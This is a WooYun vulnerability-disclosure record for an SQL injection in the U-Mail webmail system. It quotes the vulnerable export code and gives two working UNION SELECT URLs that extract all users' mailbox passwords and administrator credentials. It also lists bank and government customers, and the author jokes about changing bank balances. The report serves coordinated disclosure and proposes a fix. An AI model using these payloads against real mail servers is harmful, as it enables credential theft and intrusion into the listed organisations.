{"id": 989, "wybug_id": "wooyun-2014-072898", "wybug_title": "U-Mail邮件服务系统存在漏洞可获取所有用户密码", "wybug_corp": "U-Mail邮件服务系统", "wybug_author": "路人甲", "wybug_date": "2014-08-18 18:32", "wybug_open_date": "2014-10-02 18:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向公众公开  简要描述： 产品介绍(摘自官网)U-Mail专注于电子邮件领域15年，为企业轻松搭建最安全稳定的电子邮件系统软件。关键字：15年 最安全 最稳定涉及：金融、政府、银行，石油、军队、证券行业等重要部门，影响非常巨大，经测试受影响率：99.8%~100%场外话：我很想把农业银行拿下来的,想想还是算了,毕竟随便改卡里的数字,成土豪了，这样是极其不安全的.. 详细说明：  #1 产品介绍U-Mail邮件服务器，为企业轻松搭建最安全稳定的电子邮件系统软件。U-Mail专注于电子邮件领域15年，将广大企事业单位对邮箱服务器软件稳定安全的各类需求，与电子邮件应用管理的多样化、个性化为目标做深入开发，最大化拓展企业邮箱系统功能的灵活性和稳定性，使之成为政府部门、大专院校、中小学校、企事业集团和从事销售企业邮箱软件的网络服务商、集成商最理想的企业邮局系统架设软件。支持数字证书服务并提供强大的管理功能，可直接在WebMail中撰写或阅读经过数字签名或数字加密的安全邮件(S/MIME)。提供军事级别的高安全强度(4096位DH/DSS加密或2048位RSA加密)；使用TLS/SSL标准安全套接字层通讯协议(1024位RSA加密)，支持包括 SSL SMTP, SSL POP3, SSL IMAP4 安全通讯服务，防止网络侦听，使得通信更安全。#2 U-Mail客户案例中国外交部中国农业银行福州市人大常委会南宁国际机场上海电信公司酒泉卫星发射中心国家环境保护总局浦发银行呼和浩特分行四川省知识产权局晋中商业银行华夏航空国测卫星中心广元贵商银行国家保密技术研究所中华人民共和国厦门海事局威海市商业银行 ...还有很多很多就不一一列举了...#3 先来说说真正的漏洞漏洞文件/client/cab/module/operates.php代码如下（代码是Zend加密的，但是呢..）\nif ( ACTION == \"customer-export\" ){\t\t$cate_id = gss( $_GET['cate_id'] ) ? gss( $_GET['cate_id'] ) : \"-1\";\t\tif ( $cate_id )\t\t{\t\t\t\t$data_cache = $CAB->getCategoryByDomainID( $domain_id, 0 );\t\t\t\t$where = \"domain_id='\".$domain_id.\"'\";\t\t\t\tif ( $cate_id == \"-1\" )\t\t\t\t{\t\t\t\t\t\t$cate_id = 0;\t\t\t\t}\t\t\t\tif ( $cate_id )\t\t\t\t{\t\t\t\t\t\t$Tree = $CAB->getTreeObject( );\t\t\t\t\t\t$Tree->set_data_cache( $data_cache );\t\t\t\t\t\t$Tree->sort_data( -1, 1 );\t\t\t\t\t\t$cate_ids = $Tree->get_child_id( $cate_id );\t\t\t\t\t\t$where .= \" AND cate_id IN (\".$cate_ids.\")\";\t\t\t\t}\t\t\t\t$customer_list = $CAB->get_customer( array(\t\t\t\t\t\t\"fields\" => \"*\",\t\t\t\t\t\t\"where\" => $where,\t\t\t\t\t\t\"debug\" => 0\t\t\t\t) );\t\t\t\t$cate_list = create_array( $data_cache, \"cate_id\", \"name\" );\t\t\t\t$string = \"\\\"\".el( \"名称\", \"\" ).\"\\\",\\\"\".el( \"邮箱\", \"\" ).\"\\\",\\\"\".el( \"电话号码\", \"\" ).\"\\\",\\\"\".el( \"分类\", \"\" ).\"\\\",\\\"\".el( \"备注\", \"\" ).\"\\\",\\\"\".el( \"生日\", \"\" ).\"\\\",\\\"\".el( \"性别\", \"\" ).\"\\\",\\\"\".el( \"单位电话\", \"\" ).\"\\\",\\\"\".el( \"住宅电话\", \"\" ).\"\\\",\\\"\".el( \"QQ\", \"\" ).\"\\\",\\\"\".el( \"MSN\", \"\" ).\"\\\"\\n\";\t\t\t\tif ( $customer_list )\t\t\t\t{\t\t\t\t\t\tforeach ( $customer_list as $user )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$string .= \"\\\"\".$user['fullname'].\"\\\",\";\t\t\t\t\t\t\t\t$string .= \"\\\"\".$user['pref_email'].\"\\\",\";\t\t\t\t\t\t\t\t$string .= \"\\\"\".$user['pref_tel'].\"\\\",\";\t\t\t\t\t\t\t\t$string .= \"\\\"\".$cate_list[$user['cate_id']].\"\\\",\";\t\t\t\t\t\t\t\t$string .= \"\\\"\".$user['remark'].\"\\\",\";\t\t\t\t\t\t\t\t$string .= \"\\\"\".$user['birthday'].\"\\\",\";\t\t\t\t\t\t\t\t$string .= \"\\\"\".$user['gender'].\"\\\",\";\t\t\t\t\t\t\t\t$string .= \"\\\"\".$user['work_tel'].\"\\\",\";\t\t\t\t\t\t\t\t$string .= \"\\\"\".$user['home_tel'].\"\\\",\";\t\t\t\t\t\t\t\t$string .= \"\\\"\".$user['im_qq'].\"\\\",\";\t\t\t\t\t\t\t\t$string .= \"\\\"\".$user['im_msn'].\"\\\",\";\t\t\t\t\t\t\t\t$string .= \"\\r\\n\";\t\t\t\t\t\t}\t\t\t\t}\t\t}\t\tif ( get_session( \"language\" ) == \"zh\" )\t\t{\t\t\t\t$out_data = iconv( \"UTF-8\", \"GBK\", $string );\t\t}\t\telse\t\t{\t\t\t\t$out_data = $string;\t\t}\t\theader( \"Content-type: text/plain\" );\t\theader( \"Content-Disposition: attachment; filename=Address.csv\" );\t\theader( \"Cache-Control: must-revalidate, post-check=0, pre-check=0\" );\t\theader( \"Expires: 0\" );\t\theader( \"Pragma: public\" );\t\techo $out_data;\t\texit( );}\n$where .= \" AND cate_id IN (\".$cate_ids.\")\";带入查询。\nhttp://192.168.0.119/webmail/client/cab/index.php?module=operate&action=customer-export&cate_id=0) union select 1,2,3,mailbox,5,6,password,8,9,10,11,12,13,14,15 from userlist%23\n\n\n\n\n超级管理员在这个表,同样一键脱下所有\nhttp://192.168.0.119/webmail/client/cab/index.php?module=operate&action=customer-export&cate_id=0) union select 1,2,3,usr_name,5,6,password,8,9,10,11,12,13,14,15 from web_usr%23\n   漏洞证明：  \n\n\n\n   修复方案：  数组遍历，intval   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-08-23 12:43 厂商回复： 对于所述情况，仅能原理核实，未能在本地或互联网实例上确认(需要认证前提)，待通报和处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-18 18:33 |    \t\t番茄师傅 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:59        | http://www.tomatoyu.com/)\t\t \n  屌    \n     2014-08-18 18:45 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  mark    \n     2014-08-18 20:13 |    \t\tMelody \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | 啊)\t\t \n  mark    \n     2014-08-18 21:31 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  一个UMAIL注射也就是10rank+500rmb，我本想攒着搞点大动作,看这架势藏不住了，哎，我也去发一个，希望没和你这个重复。    \n     2014-08-18 23:24 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @pandas UMAIL注入都是2000吧    \n     2014-08-19 02:15 |    \t\tACGT \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:4        | another script kiddie)\t\t \n  @xsser 请问为什么路人甲的漏洞列表里没这个漏洞？    \n     2014-08-19 02:24 |    \t\tACGT \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:4        | another script kiddie)\t\t \n  明白了，选了匿名提交。可是如果某个匿名提交的漏洞没上首页，也不在白帽子的漏洞列表里，也不在厂商的漏洞列表里（假设厂商没注册），岂不是公开后也无法被搜索引擎索引到？    \n     2014-08-25 20:43 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  @贫道来自河北 数字好像是2k+，在乌云只有500？我记得数字一直比乌云价格低的阿！@疯狗    \n     2014-08-27 09:37 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  您好感谢您对CNVD的支持，请问1.漏洞复现是否需要登录等先决条件？2.是否发现有公网案例可以复现漏洞？以便我们复现。 祝好！    \n     2014-08-27 10:07 |    \t\tgodblessme \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:3        | 维护世界和平)\t\t \n  大神不许拿俺公司做小白鼠。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}